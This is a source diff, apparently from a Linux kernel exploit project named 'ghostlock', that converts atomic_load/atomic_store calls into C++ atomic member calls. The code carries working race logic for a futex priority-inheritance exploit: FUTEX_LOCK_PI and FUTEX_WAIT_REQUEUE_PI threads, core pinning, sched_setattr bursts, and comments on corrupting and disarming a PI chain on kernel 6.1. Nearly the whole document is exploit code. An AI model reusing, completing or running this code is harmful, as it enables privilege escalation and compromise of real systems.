@@ -24,15 +24,15 @@ void *waiter_thread(void *arg) {
     const WriteRequest *request = race->request;
     support::disable_rseq_for_thread();
     int tid = (int) syscall(SYS_gettid);
-    atomic_store(&race->waiter_tid, tid);
+    race->waiter_tid.store(tid);
     if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
         pr_error("waiter lock chain errno=%d\n", errno);
-    atomic_store(&race->waiter_ready, 1);
-    while (!atomic_load(&race->owner_started))
+    race->waiter_ready.store(1);
+    while (!race->owner_started.load())
         usleep(ops::execution_settings()->race_state_poll_interval_us);
     struct timespec timeout;
     SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-    if (atomic_load(&race->fast_repair)) {
+    if (race->fast_repair.load()) {
         timeout.tv_nsec += 20000000L;
         if (timeout.tv_nsec >= 1000000000L) {
             timeout.tv_sec++;
@@ -48,7 +48,7 @@ void *waiter_thread(void *arg) {
             timeout.tv_nsec -= 1000000000L;
         }
     }
-    atomic_store(&race->waiter_waiting, 1);
+    race->waiter_waiting.store(1);
     support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
             &race->target_futex, 0);
     route::RouteKind selected = support::kernel5_route_selected()
@@ -74,9 +74,9 @@ void *waiter_thread(void *arg) {
         long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
         pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
     }
-    atomic_store(&race->route_done, 1);
+    race->route_done.store(1);
     support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
-    while (!atomic_load(&race->owner_chain_done))
+    while (!race->owner_chain_done.load())
         usleep(ops::execution_settings()->race_state_poll_interval_us);
     return nullptr;
 }
@@ -89,18 +89,18 @@ void *owner_thread(void *arg) {
     long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
     if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
-    while (!atomic_load(&race->waiter_ready) &&
-            !atomic_load(&race->owner_stop))
+    while (!race->waiter_ready.load() &&
+            !race->owner_stop.load())
         usleep(ops::execution_settings()->race_state_poll_interval_us);
-    if (atomic_load(&race->owner_stop)) {
+    if (race->owner_stop.load()) {
         if (lock_target == 0)
             support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         return nullptr;
     }
-    atomic_store(&race->owner_started, 1);
+    race->owner_started.store(1);
     support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
-    atomic_store(&race->owner_chain_done, 1);
-    while (!atomic_load(&race->owner_stop)) sleep(1);
+    race->owner_chain_done.store(1);
+    while (!race->owner_stop.load()) sleep(1);
     if (lock_target == 0)
         support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
     return nullptr;
@@ -115,26 +115,26 @@ void *consumer_thread(void *arg) {
     pin_to_core((size_t) race->consumer_cpu);
     pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
     int seen = 0;
-    while (!atomic_load(&race->consumer_stop)) {
-        int seq = atomic_load(&race->consumer_go);
+    while (!race->consumer_stop.load()) {
+        int seq = race->consumer_go.load();
         if (seq == 0 || seq == seen) {
             __asm__ volatile("yield":: : "memory");
             continue;
         }
         seen = seq;
-        int tid = atomic_load(&race->waiter_tid);
+        int tid = race->waiter_tid.load();
         int calls_this_seq = 0;
-        while (!atomic_load(&race->consumer_stop) &&
-                atomic_load(&race->consumer_go) == seq) {
-            int delay_usec = atomic_load(&race->route_delay_usec);
+        while (!race->consumer_stop.load() &&
+                race->consumer_go.load() == seq) {
+            int delay_usec = race->route_delay_usec.load();
             if (delay_usec > 0) usleep((useconds_t) delay_usec);
             for (uint32_t burst = 0;
                  burst < ops::execution_settings()->select_consumer_burst_calls; burst++) {
-                if (atomic_load(&race->consumer_stop) ||
-                        atomic_load(&race->consumer_go) != seq)
+                if (race->consumer_stop.load() ||
+                        race->consumer_go.load() != seq)
                     break;
-                atomic_fetch_add(&race->consumer_calls, 1);
-                atomic_store(&race->consumer_inflight, 1);
+                race->consumer_calls.fetch_add(1);
+                race->consumer_inflight.store(1);
                 errno = 0;
                 /* rotate the nice every call; (calls%19)+1 is what makes
                  * sched_setattr succeed on 6.1 compact */
@@ -152,12 +152,12 @@ void *consumer_thread(void *arg) {
                         sched_ret = 0;
                     }
                 }
-                if (sched_ret == 0) atomic_fetch_add(&race->consumer_success, 1);
-                atomic_store(&race->consumer_inflight, 0);
+                if (sched_ret == 0) race->consumer_success.fetch_add(1);
+                race->consumer_inflight.store(0);
                 calls_this_seq++;
                 if ((uint32_t) calls_this_seq >=
                         ops::execution_settings()->select_consumer_max_calls) {
-                    atomic_store(&race->consumer_go, 0);
+                    race->consumer_go.store(0);
                     break;
                 }
             }
@@ -169,11 +169,11 @@ void *consumer_thread(void *arg) {
 /* Decoupling plan: reset one PI race attempt. Input/output: PiRaceContext;
  * output: initialized synchronization state; lifecycle lives in PiRace::reset(). */
 void reset_main_route_state(void) {
-    int fast_repair = atomic_load(&g_exploit_session.race.fast_repair);
+    int fast_repair = g_exploit_session.race.fast_repair.load();
     g_exploit_session.race.reset(
             fast_repair ? 5000 : (int) ops::execution_settings()->select_enter_delay_us,
             runtime_config_snapshot().main_cpu, runtime_config_snapshot().consumer_cpu);
-    atomic_store(&g_exploit_session.race.fast_repair, fast_repair);
+    g_exploit_session.race.fast_repair.store(fast_repair);
 }
 
 }  // namespace ghostlock::race
@@ -182,10 +182,10 @@ void reset_main_route_state(void) {
  * route outcome once the waiter reported completion. The count/timeout policy
  * lives in outcome_with_counters() and TODO(pi-timeout-01). */
 RouteStatus PiRace::run() noexcept {
-    while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
+    while (!waiter_waiting.load() || !owner_started.load())
         usleep(ops::execution_settings()->race_state_poll_interval_us);
     pr_info("[route] waiter parked; owner started\n");
-    usleep(atomic_load(&fast_repair)
+    usleep(fast_repair.load()
             ? 5000
             : ops::execution_settings()->race_setup_settle_us);
     errno = 0;
@@ -199,11 +199,11 @@ RouteStatus PiRace::run() noexcept {
      * backpressure) parks the process forever and the corrupted PI chain is
      * never disarmed. Bound the wait from TargetProfile.execution and map a
      * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
-    while (!atomic_load(&route_done))
+    while (!route_done.load())
         usleep(ops::execution_settings()->race_state_poll_interval_us);
     const RouteStatus status = route_status;
-    const int calls = atomic_load(&consumer_calls);
-    const int success = atomic_load(&consumer_success);
+    const int calls = consumer_calls.load();
+    const int success = consumer_success.load();
     pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
             "calls=%d success=%d\n", status.code, status.userspace_clean,
             status.kernel_disarmed, status.step, status.error_number,
